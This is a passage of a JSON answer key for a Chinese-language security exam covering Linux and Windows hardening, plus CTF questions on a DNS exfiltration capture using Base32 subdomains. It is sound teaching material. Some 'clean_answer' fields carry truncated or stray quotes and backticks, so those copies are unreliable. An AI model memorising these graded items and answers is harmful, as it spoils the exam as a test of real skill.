        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "`PASS_MAX_DAYS 90`",
      "clean_answer": "PASS_MAX_DAYS 90",
      "basis": "`/etc/login.defs` 中 `PASS_MAX_DAYS` 控制新建立使用者密碼的最長有效天數。",
      "full_solution": "- **官方標準答案**：`PASS_MAX_DAYS 90`\n\n- **解析依據**：`/etc/login.defs` 中 `PASS_MAX_DAYS` 控制新建立使用者密碼的最長有效天數。"
    },
    {
      "id": 28,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "密碼複雜度加固：在 `/etc/security/pwquality.conf` 中，欲要求密碼最短長度為 12 個字元，且至少包含大小寫英文字母、數字與特殊符號，應設定哪些關鍵參數？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "`minlen = 12`，`dcredit = -1` (至少1數字)，`ucredit = -1` (至少1大寫)，`lcredit = -1` (至少1小寫)，`ocredit = -1` (至少1特殊字元)",
      "clean_answer": "minlen = 12`，`dcredit = -1` (至少1數字)，`ucredit = -1` (至少1大寫)，`lcredit = -1` (至少1小寫)，`ocredit = -1` (至少1特殊字元)",
      "basis": "`pwquality.conf` 中負值代表強制要求該類型字元的最小數量。",
      "full_solution": "- **官方標準答案**：`minlen = 12`，`dcredit = -1` (至少1數字)，`ucredit = -1` (至少1大寫)，`lcredit = -1` (至少1小寫)，`ocredit = -1` (至少1特殊字元)\n\n- **解析依據**：`pwquality.conf` 中負值代表強制要求該類型字元的最小數量。"
    },
    {
      "id": 29,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "防暴力破解：在 Ubuntu/Debian 中配置 PAM 登入失敗處理模組，若設定連續輸錯 5 次鎖定 15 分鐘，應在 PAM 設定檔中追加何種模組配置語法？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "在 `/etc/pam.d/common-auth` 中加入 `auth required pam_faillock.so preauth silent audit deny=5 unlock_time=900`",
      "clean_answer": "在 `/etc/pam.d/common-auth` 中加入 `auth required pam_faillock.so preauth silent audit deny=5 unlock_time=900",
      "basis": "`pam_faillock` 模組透過 `deny=5 unlock_time=900` 達成連續錯誤 5 次鎖定 900 秒（15 分鐘）。",
      "full_solution": "- **官方標準答案**：在 `/etc/pam.d/common-auth` 中加入 `auth required pam_faillock.so preauth silent audit deny=5 unlock_time=900`\n\n- **解析依據**：`pam_faillock` 模組透過 `deny=5 unlock_time=900` 達成連續錯誤 5 次鎖定 900 秒（15 分鐘）。"
    },
    {
      "id": 30,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "特殊權限清理：資安稽核要求清查系統中所有具備 SUID 特殊權限的檔案，請寫出使用 `find` 命令搜尋根目錄下所有 SUID 檔案的完整命令。  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "`find / -perm -4000 -type f 2>/dev/null` (或 `find / -perm -u=s -type f 2>/dev/null`)",
      "clean_answer": "find / -perm -4000 -type f 2>/dev/null` (或 `find / -perm -u=s -type f 2>/dev/null`)",
      "basis": "`-perm -4000` 匹配所有具備 SUID 八進位權限的檔案，`2>/dev/null` 屏蔽無權限存取目錄的報錯資訊。",
      "full_solution": "- **官方標準答案**：`find / -perm -4000 -type f 2>/dev/null` (或 `find / -perm -u=s -type f 2>/dev/null`)\n\n- **解析依據**：`-perm -4000` 匹配所有具備 SUID 八進位權限的檔案，`2>/dev/null` 屏蔽無權限存取目錄的報錯資訊。"
    },
    {
      "id": 31,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "檔案系統權限加固：針對系統關鍵密碼影子檔案 `/etc/shadow`，合規的權限數值（Octal）與擁有人/群組應為何？  \n\n  【作答區】：權限：____________，Owner/Group：____________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "權限：`0640` (或 `0000` / `0600`)，Owner/Group：`root:shadow` (或 `root:root`)",
      "clean_answer": "權限：`0640` (或 `0000` / `0600`)，Owner/Group：`root:shadow` (或 `root:root`)",
      "basis": "合規基準要求 `/etc/shadow` 僅 root 與 shadow 群組可讀，禁止任何普通使用者讀取。",
      "full_solution": "- **官方標準答案**：權限：`0640` (或 `0000` / `0600`)，Owner/Group：`root:shadow` (或 `root:root`)\n\n- **解析依據**：合規基準要求 `/etc/shadow` 僅 root 與 shadow 群組可讀，禁止任何普通使用者讀取。"
    },
    {
      "id": 32,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "核心安全加固：在 `/etc/sysctl.conf` 中，欲禁止系統響應 ICMP 廣播請求以防範 Smurf 放大攻擊，應設定哪一條核心參數？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "`net.ipv4.icmp_echo_ignore_broadcasts = 1`",
      "clean_answer": "net.ipv4.icmp_echo_ignore_broadcasts = 1",
      "basis": "在 `/etc/sysctl.conf` 中將該核心參數設為 1 可忽略所有發往子網廣播位址的 ICMP Echo 請求。",
      "full_solution": "- **官方標準答案**：`net.ipv4.icmp_echo_ignore_broadcasts = 1`\n\n- **解析依據**：在 `/etc/sysctl.conf` 中將該核心參數設為 1 可忽略所有發往子網廣播位址的 ICMP Echo 請求。"
    },
    {
      "id": 33,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "核心安全加固：欲停用 IP 路由轉發功能（防止主機被當作跳板路由），應在 `sysctl.conf` 中設定哪一條參數？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "`net.ipv4.ip_forward = 0`",
      "clean_answer": "net.ipv4.ip_forward = 0",
      "basis": "將 `ip_forward` 設為 0 關閉 IPv4 路由轉發。",
      "full_solution": "- **官方標準答案**：`net.ipv4.ip_forward = 0`\n\n- **解析依據**：將 `ip_forward` 設為 0 關閉 IPv4 路由轉發。"
    },
    {
      "id": 34,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "防火牆加固：使用 UFW（Uncomplicated Firewall）設定預設拒絕所有入站連線、允許所有出站連線，應執行哪兩條指令？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "`ufw default deny incoming` 與 `ufw default allow outgoing`",
      "clean_answer": "ufw default deny incoming` 與 `ufw default allow outgoing",
      "basis": "設定 UFW 預設原則為拒絕所有入站、允許所有出站。",
      "full_solution": "- **官方標準答案**：`ufw default deny incoming` 與 `ufw default allow outgoing`\n\n- **解析依據**：設定 UFW 預設原則為拒絕所有入站、允許所有出站。"
    },
    {
      "id": 35,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "防火牆加固：在 `iptables` 中設定允許已建立連線（ESTABLISHED, RELATED）的封包通過，以維持正常連線狀態，應寫入哪條規則？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "`iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT` (或 `-m state --state ...`)",
      "clean_answer": "iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT` (或 `-m state --state ...`)",
      "basis": "基於連線狀態追蹤機制放行已建立連線之雙向回應封包。",
      "full_solution": "- **官方標準答案**：`iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT` (或 `-m state --state ...`)\n\n- **解析依據**：基於連線狀態追蹤機制放行已建立連線之雙向回應封包。"
    },
    {
      "id": 36,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "Sudo 特權管理：在 `/etc/sudoers` 中，下列配置存在嚴重提權隱患：`deployer ALL=(ALL) NOPASSWD: /usr/bin/find`。請寫出修改後的安全限制方式，或說明為何不應授與 `find` 無密碼執行權。  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "將其從 sudoers 中完全移除；或若需特定尋找功能，應封裝成限定路徑與參數的固定 Shell 腳本，禁止直接授權帶有 `-exec` 參數的二進位程式。",
      "clean_answer": "將其從 sudoers 中完全移除；或若需特定尋找功能，應封裝成限定路徑與參數的固定 Shell 腳本，禁止直接授權帶有 `-exec` 參數的二進位程式。",
      "basis": "`find` 的 `-exec` 能直接衍生任意 shell，授與 `find` 無密碼 sudo 等同於直接贈與 root 權限。",
      "full_solution": "- **官方標準答案**：將其從 sudoers 中完全移除；或若需特定尋找功能，應封裝成限定路徑與參數的固定 Shell 腳本，禁止直接授權帶有 `-exec` 參數的二進位程式。\n\n- **解析依據**：`find` 的 `-exec` 能直接衍生任意 shell，授與 `find` 無密碼 sudo 等同於直接贈與 root 權限。"
    },
    {
      "id": 37,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "日誌防護加固：欲防止重要日誌 `/var/log/secure` 被包含 root 在內的任何使用者刪除或覆寫（僅允許追加寫入），應使用 Linux 哪一個檔案屬性控制指令及參數？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "`chattr +a /var/log/secure` (或 `chattr +i` 設定完全不可變)",
      "clean_answer": "chattr +a /var/log/secure` (或 `chattr +i` 設定完全不可變)",
      "basis": "`+a` 屬性表示 append-only（僅允許追加寫入），連 root 都無法刪除或覆寫已存在的日誌內容。",
      "full_solution": "- **官方標準答案**：`chattr +a /var/log/secure` (或 `chattr +i` 設定完全不可變)\n\n- **解析依據**：`+a` 屬性表示 append-only（僅允許追加寫入），連 root 都無法刪除或覆寫已存在的日誌內容。"
    },
    {
      "id": 38,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Linux 安全加固",
      "type": "lab_question",
      "question": "歷史命令記錄加固：為使 bash 歷史紀錄能包含執行時間戳以便鑑識溯源，應在 `/etc/profile` 中導出哪一個環境變數？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Linux 安全加固篇 (第 24 ~ 38 題)】"
      ],
      "answer": "`export HISTTIMEFORMAT=\"%F %T \"`",
      "clean_answer": "export HISTTIMEFORMAT=\"%F %T",
      "basis": "導出該變數後，`history` 指令輸出將精確標註每條歷史命令的執行年月日時分秒。",
      "full_solution": "- **官方標準答案**：`export HISTTIMEFORMAT=\"%F %T \"`\n\n- **解析依據**：導出該變數後，`history` 指令輸出將精確標註每條歷史命令的執行年月日時分秒。"
    },
    {
      "id": 39,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "帳戶鎖定策略：在本機安全性原則（secpol.msc）中，欲設定「連續登入失敗 5 次後鎖定帳戶 30 分鐘」，需設定哪兩個關鍵原則項目？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "「帳戶鎖定閥值」（Account lockout threshold）設定為 5 次；「帳戶鎖定期間」（Account lockout duration）設定為 30 分鐘。",
      "clean_answer": "「帳戶鎖定閥值」（Account lockout threshold）設定為 5 次；「帳戶鎖定期間」（Account lockout duration）設定為 30 分鐘。",
      "basis": "Windows 本機原則中的標準兩項帳戶鎖定配置。",
      "full_solution": "- **官方標準答案**：「帳戶鎖定閥值」（Account lockout threshold）設定為 5 次；「帳戶鎖定期間」（Account lockout duration）設定為 30 分鐘。\n\n- **解析依據**：Windows 本機原則中的標準兩項帳戶鎖定配置。"
    },
    {
      "id": 40,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "密碼歷程原則：為防止使用者在密碼過期時重複改回原本的舊密碼，應啟用哪一項密碼原則並至少設定記住幾次舊密碼？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "啟用「強制密碼歷程」（Enforce password history），至少設定記住 `5` 次（或 24 次）。",
      "clean_answer": "啟用「強制密碼歷程」（Enforce password history），至少設定記住 `5` 次（或 24 次）。",
      "basis": "防止使用者在密碼過期輪替時立即重複使用前幾次的舊密碼。",
      "full_solution": "- **官方標準答案**：啟用「強制密碼歷程」（Enforce password history），至少設定記住 `5` 次（或 24 次）。\n\n- **解析依據**：防止使用者在密碼過期輪替時立即重複使用前幾次的舊密碼。"
    },
    {
      "id": 41,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "協定加固：欲在 Windows Server 2016/2019 中徹底停用高風險且易受永恆之藍攻擊的 SMBv1 協定，應執行的 PowerShell 指令為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol` (或 `Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force`)",
      "clean_answer": "Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol` (或 `Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force`)",
      "basis": "PowerShell 停用 SMBv1 協定的標準命令。",
      "full_solution": "- **官方標準答案**：`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol` (或 `Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force`)\n\n- **解析依據**：PowerShell 停用 SMBv1 協定的標準命令。"
    },
    {
      "id": 42,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "網路共享加固：Windows 預設會開啟管理共用（如 `C$`, `ADMIN$`），若要透過登錄檔（Registry）全域關閉伺服器版 Windows 的預設管理共用，應在 `HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters` 新增哪一個 DWORD 值？其數值應設為何？  \n\n  【作答區】：機碼名稱：____________，數值：____________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "機碼名稱：`AutoShareServer`，數值：`0` (DWORD)",
      "clean_answer": "機碼名稱：`AutoShareServer`，數值：`0` (DWORD)",
      "basis": "在伺服器版 Windows 中將 `AutoShareServer` 設為 0 可於開機時自動停用管理共用（工作站版對應 `AutoShareWks`）。",
      "full_solution": "- **官方標準答案**：機碼名稱：`AutoShareServer`，數值：`0` (DWORD)\n\n- **解析依據**：在伺服器版 Windows 中將 `AutoShareServer` 設為 0 可於開機時自動停用管理共用（工作站版對應 `AutoShareWks`）。"
    },
    {
      "id": 43,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "遠端桌面 RDP 加固：欲強制 RDP 連線必須使用「網路層級驗證」（Network Level Authentication, NLA），此設定主要防止何種攻擊？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "防止 RDP 中間人攻擊（MITM）與連線建立前的預驗證拒絕服務攻擊（如 BlueKeep 預認證 RCE）。",
      "clean_answer": "防止 RDP 中間人攻擊（MITM）與連線建立前的預驗證拒絕服務攻擊（如 BlueKeep 預認證 RCE）。",
      "basis": "NLA 強制客戶端在與 RDP 伺服器建立正式繪圖連線前，必須先透過 CredSSP 完成身分驗證。",
      "full_solution": "- **官方標準答案**：防止 RDP 中間人攻擊（MITM）與連線建立前的預驗證拒絕服務攻擊（如 BlueKeep 預認證 RCE）。\n\n- **解析依據**：NLA 強制客戶端在與 RDP 伺服器建立正式繪圖連線前，必須先透過 CredSSP 完成身分驗證。"
    },
    {
      "id": 44,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "安全稽核原則：為完整監控攻擊者在 Windows 上的活動，在進階稽核原則中，必須將哪兩項核心事件設定為「成功與失敗均記錄」？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "「稽核登入事件」（Audit Logon Events）與「稽核帳戶管理」（Audit Account Management）（均勾選成功與失敗）。",
      "clean_answer": "「稽核登入事件」（Audit Logon Events）與「稽核帳戶管理」（Audit Account Management）（均勾選成功與失敗）。",
      "basis": "監控帳戶登入（Event 4624/4625）與提權/建立帳號（Event 4720）的最高優先度稽核項目。",
      "full_solution": "- **官方標準答案**：「稽核登入事件」（Audit Logon Events）與「稽核帳戶管理」（Audit Account Management）（均勾選成功與失敗）。\n\n- **解析依據**：監控帳戶登入（Event 4624/4625）與提權/建立帳號（Event 4720）的最高優先度稽核項目。"
    },
    {
      "id": 45,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "進程建立稽核：為了在 Event ID 4688 中能夠記錄到完整的進程命令列參數（如 PowerShell 執行的具體參數），必須啟用群組原則中的哪一項設定？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "啟用「在處理序建立事件中包含命令列」（Include command line in process creation events）。",
      "clean_answer": "啟用「在處理序建立事件中包含命令列」（Include command line in process creation events）。",
      "basis": "在電腦設定 -> 系統管理範本 -> 系統 -> 稽核程序建立原則中啟用該項，才能在 Event ID 4688 中捕獲具體參數。",
      "full_solution": "- **官方標準答案**：啟用「在處理序建立事件中包含命令列」（Include command line in process creation events）。\n\n- **解析依據**：在電腦設定 -> 系統管理範本 -> 系統 -> 稽核程序建立原則中啟用該項，才能在 Event ID 4688 中捕獲具體參數。"
    },
    {
      "id": 46,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "本機系統帳號加固：在 Windows 安裝完成後，針對預設內建的 `Guest`（來賓帳戶）與 `Administrator`，最佳加固處置措施分別為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "停用 `Guest` 帳戶；將預設 `Administrator` 帳戶重新命名為非常見名稱，並為其設定強密碼。",
      "clean_answer": "停用 `Guest` 帳戶；將預設 `Administrator` 帳戶重新命名為非常見名稱，並為其設定強密碼。",
      "basis": "消滅內建帳號名稱所引發的字典撞庫與橫向利用風險。",
      "full_solution": "- **官方標準答案**：停用 `Guest` 帳戶；將預設 `Administrator` 帳戶重新命名為非常見名稱，並為其設定強密碼。\n\n- **解析依據**：消滅內建帳號名稱所引發的字典撞庫與橫向利用風險。"
    },
    {
      "id": 47,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "記憶體保護加固：欲在 Windows 10/Server 2019 上啟用 DEP（資料執行防止）並保護所有進程，應在管理員命令提示字元執行哪一條 `bcdedit` 指令？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "`bcdedit.exe /set {current} nx AlwaysOn`",
      "clean_answer": "bcdedit.exe /set {current} nx AlwaysOn",
      "basis": "將 NX（DEP）原則強制設定為 `AlwaysOn`，所有進程一律強制啟用資料執行防止。",
      "full_solution": "- **官方標準答案**：`bcdedit.exe /set {current} nx AlwaysOn`\n\n- **解析依據**：將 NX（DEP）原則強制設定為 `AlwaysOn`，所有進程一律強制啟用資料執行防止。"
    },
    {
      "id": 48,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "本機認證安全加固：為防禦 Pass-the-Hash 攻擊並禁止快取 LM 與 NTLMv1 雜湊，應在安全性選項中將「網路安全性: LAN Manager 驗證層級」設定為哪一個合規等級？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "等級 5：「僅傳送 NTLMv2 回應，拒絕 LM 和 NTLM」（Send NTLMv2 response only. Refuse LM & NTLM）。",
      "clean_answer": "等級 5：「僅傳送 NTLMv2 回應，拒絕 LM 和 NTLM」（Send NTLMv2 response only. Refuse LM & NTLM）。",
      "basis": "徹底淘汰易遭受彩虹表爆破與中間人破解的弱 LM 與 NTLMv1 協定。",
      "full_solution": "- **官方標準答案**：等級 5：「僅傳送 NTLMv2 回應，拒絕 LM 和 NTLM」（Send NTLMv2 response only. Refuse LM & NTLM）。\n\n- **解析依據**：徹底淘汰易遭受彩虹表爆破與中間人破解的弱 LM 與 NTLMv1 協定。"
    },
    {
      "id": 49,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "WinRM 安全加固：若企業使用 Windows 遠端管理（WinRM），應強制要求連線走 HTTPS（端口 5986）並停用哪一種不安全的認證協議？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "停用基本驗證（Basic Authentication）與未加密連線。",
      "clean_answer": "停用基本驗證（Basic Authentication）與未加密連線。",
      "basis": "WinRM 基本認證以明文傳遞密碼，必須停用並強制走 Negotiate/Kerberos 或 HTTPS。",
      "full_solution": "- **官方標準答案**：停用基本驗證（Basic Authentication）與未加密連線。\n\n- **解析依據**：WinRM 基本認證以明文傳遞密碼，必須停用並強制走 Negotiate/Kerberos 或 HTTPS。"
    },
    {
      "id": 50,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "Windows 防火牆設定：欲透過 `netsh` 或 PowerShell 指令建立規則，封鎖所有入站的 TCP 445（SMB）端口連線，應寫出何種指令？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "`netsh advfirewall firewall add rule name=\"Block_SMB_445\" protocol=TCP dir=in localport=445 action=block` (或 `New-NetFirewallRule -DisplayName \"Block SMB\" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block`)",
      "clean_answer": "netsh advfirewall firewall add rule name=\"Block_SMB_445\" protocol=TCP dir=in localport=445 action=block` (或 `New-NetFirewallRule -DisplayName \"Block SMB\" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block`)",
      "basis": "在 Windows 防火牆建立入站阻塞規則防禦未授權 SMB 存取。",
      "full_solution": "- **官方標準答案**：`netsh advfirewall firewall add rule name=\"Block_SMB_445\" protocol=TCP dir=in localport=445 action=block` (或 `New-NetFirewallRule -DisplayName \"Block SMB\" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block`)\n\n- **解析依據**：在 Windows 防火牆建立入站阻塞規則防禦未授權 SMB 存取。"
    },
    {
      "id": 51,
      "exam": "exam_b",
      "domain": "第二部分：系統安全加固實務演練",
      "category": "Windows 安全加固",
      "type": "lab_question",
      "question": "系統更新加固：針對重要關鍵伺服器，安全基準規範中對於微軟每個月例行安全性更新（Patch Tuesday）的修補評估與驗證測試週期建議最長不應超過多少天？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【Windows 安全加固篇 (第 39 ~ 51 題)】"
      ],
      "answer": "`30` 天（關鍵高危漏洞通常要求 7 ~ 14 天內完成修補）。",
      "clean_answer": "30` 天（關鍵高危漏洞通常要求 7 ~ 14 天內完成修補）。",
      "basis": "國際標準規範要求一般安全性修補週期不超過 30 天，CVSS $\\ge 9.0$ 重大漏洞需於 72 小時至 7 天內完成緊急修補。",
      "full_solution": "- **官方標準答案**：`30` 天（關鍵高危漏洞通常要求 7 ~ 14 天內完成修補）。\n\n- **解析依據**：國際標準規範要求一般安全性修補週期不超過 30 天，CVSS $\\ge 9.0$ 重大漏洞需於 72 小時至 7 天內完成緊急修補。"
    },
    {
      "id": 52,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "根據【證據 E】，在 `Topic1.pcap` 中，DNS 外洩通道所查詢的頂層權威網域名稱（Domain）為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 E：Topic1.pcap 之 DNS 異常查詢序列節錄】"
      ],
      "answer": "`tunnel.exfil.org`",
      "clean_answer": "tunnel.exfil.org",
      "basis": "【證據 E】所有查詢子域名的頂層後綴均固定為 `.tunnel.exfil.org`。",
      "full_solution": "- **官方標準答案**：`tunnel.exfil.org`\n\n- **解析依據**：【證據 E】所有查詢子域名的頂層後綴均固定為 `.tunnel.exfil.org`。"
    },
    {
      "id": 53,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "根據【證據 E】，子域名最前端的 `s000`、`s001` 等字串其具體作用為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 E：Topic1.pcap 之 DNS 異常查詢序列節錄】"
      ],
      "answer": "分片序列號（Sequence Number），用於標識資料分片的先後順序，確保接收端拼接時不失序。",
      "clean_answer": "分片序列號（Sequence Number），用於標識資料分片的先後順序，確保接收端拼接時不失序。",
      "basis": "`s000`, `s001`, ... `s061` 代表第 0 號至第 61 號資料封包分片。",
      "full_solution": "- **官方標準答案**：分片序列號（Sequence Number），用於標識資料分片的先後順序，確保接收端拼接時不失序。\n\n- **解析依據**：`s000`, `s001`, ... `s061` 代表第 0 號至第 61 號資料封包分片。"
    },
    {
      "id": 54,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "根據【證據 E】，子域名資料負載所採用的編碼字符集僅包含大寫字母 `A-Z` 與數字 `2-7`，此特徵符合哪一種標準編碼演算法？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 E：Topic1.pcap 之 DNS 異常查詢序列節錄】"
      ],
      "answer": "`Base32` 編碼",
      "clean_answer": "Base32` 編碼",
      "basis": "Base32 字符集為大寫字母 `A-Z` 與數字 `2-7`（共 32 個字元），不包含容易與數字 0/1 混淆的字母 O、I，極度適合在對大小寫不敏感的 DNS 查詢中傳輸數據。",
      "full_solution": "- **官方標準答案**：`Base32` 編碼\n\n- **解析依據**：Base32 字符集為大寫字母 `A-Z` 與數字 `2-7`（共 32 個字元），不包含容易與數字 0/1 混淆的字母 O、I，極度適合在對大小寫不敏感的 DNS 查詢中傳輸數據。"
    },
    {
      "id": 55,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在 RFC 4648 規範中，Base32 編碼的填充字元（Padding）通常為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`=` (等號)",
      "clean_answer": "=` (等號)",
      "basis": "RFC 4648 定義 Base32 編碼在不足 40 位元（5 位元組）分組時使用 `=` 作為填充。在 DNS 域名中為防語法報錯，填充等號常被省略或替換。",
      "full_solution": "- **官方標準答案**：`=` (等號)\n\n- **解析依據**：RFC 4648 定義 Base32 編碼在不足 40 位元（5 位元組）分組時使用 `=` 作為填充。在 DNS 域名中為防語法報錯，填充等號常被省略或替換。"
    },
    {
      "id": 56,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "根據【證據 E】，從第一個外洩請求 `s000` 到最後一個 `s061`，攻擊者總共發送了多少個 DNS 查詢分片？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 E：Topic1.pcap 之 DNS 異常查詢序列節錄】"
      ],
      "answer": "`62` 個",
      "clean_answer": "62` 個",
      "basis": "從 `s000` 到 `s061`，編號從 0 開始計數至 61，總計為 $61 - 0 + 1 = 62$ 個查詢請求。",
      "full_solution": "- **官方標準答案**：`62` 個\n\n- **解析依據**：從 `s000` 到 `s061`，編號從 0 開始計數至 61，總計為 $61 - 0 + 1 = 62$ 個查詢請求。"
    },
    {
      "id": 57,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "根據【證據 F】，解碼還原後的檔案格式為何？該檔案的表頭欄位包含哪些？  \n\n  【作答區】：檔案格式：____________，欄位：____________",
      "related_evidence": [
        "【證據 F：DNS 載荷還原與外洩客戶資料庫 (CSV 片段)】"
      ],
      "answer": "檔案格式：`CSV` 檔案；欄位：`id, name, credit_card, phone, email`",
      "clean_answer": "檔案格式：`CSV` 檔案；欄位：`id, name, credit_card, phone, email",
      "basis": "【證據 F】表頭第一行為 `id,name,credit_card,phone,email`，標準逗號分隔格式。",
